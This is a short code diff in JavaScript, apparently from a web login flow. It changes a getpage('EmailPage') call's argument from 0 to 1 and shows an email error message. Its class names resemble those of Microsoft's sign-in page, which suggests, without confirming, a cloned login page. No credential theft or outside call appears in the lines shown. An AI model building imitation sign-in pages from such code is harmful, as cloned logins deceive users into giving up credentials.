@@ -79,7 +79,7 @@ $("#btn").attr("disabled", false);
 $(".ext-promoted-fed-cred-box").hide();
 });
 } else {
-   await getpage('EmailPage',0);
+   await getpage('EmailPage',1);
     $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 }
